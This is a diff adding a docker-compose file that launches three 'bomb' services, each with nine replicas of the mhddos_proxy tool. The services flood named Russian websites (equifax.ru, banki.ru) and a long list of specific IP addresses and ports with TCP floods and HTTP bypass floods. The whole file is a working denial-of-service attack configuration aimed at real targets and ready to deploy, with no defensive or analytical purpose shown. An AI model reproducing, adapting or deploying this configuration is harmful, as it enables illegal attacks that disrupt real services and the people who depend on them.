@@ -1,0 +1,26 @@
+version: '3'
+
+services:
+
+  bomb01:
+    image: portholeascend/mhddos_proxy:latest
+    command:  tcp://89.108.106.50:80 tcp://89.108.106.50:443 -t 1000 -p 300 --rpc 100 --http-methods TCP FLOOD --debug
+    deploy:
+      replicas: 9
+
+  bomb02:
+    image: portholeascend/mhddos_proxy:latest
+    command: https://www.equifax.ru/  https://www.banki.ru/ -t 1000 -p 300 --rpc 50 --http-methods bypass --debug
+    deploy:
+      replicas: 9
+
+
+  bomb03:
+    image: portholeascend/mhddos_proxy:latest
+    command: tcp://37.16.85.110:80  tcp://37.16.85.110:443 tcp://37.16.85.113:80  tcp://37.16.85.113::443 tcp://178.216.96.114:80  tcp://178.216.96.114:443 tcp://176.74.12.38:53 tcp://176.74.12.38:80 tcp://176.74.12.38:264 tcp://176.74.12.38:443 tcp://176.74.12.38:444 tcp://176.74.12.38:500 tcp://37.16.85.182:80 tcp://37.16.85.182:443 tcp://185.71.67.241:80 tcp://185.71.67.241:443 tcp://185.10.61.125:80 tcp://185.10.61.125:443 tcp://92.223.124.254:80 tcp://92.223.124.254:443 tcp://92.223.124.254:444 tcp://212.24.61.92:53 tcp://185.10.61.116:80 tcp://185.10.61.116:443 tcp://176.112.198.163:22 tcp://176.112.198.163:53 tcp://176.112.198.163:953 -t 1000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug
+    deploy:
+      replicas: 9
+
+
+
+
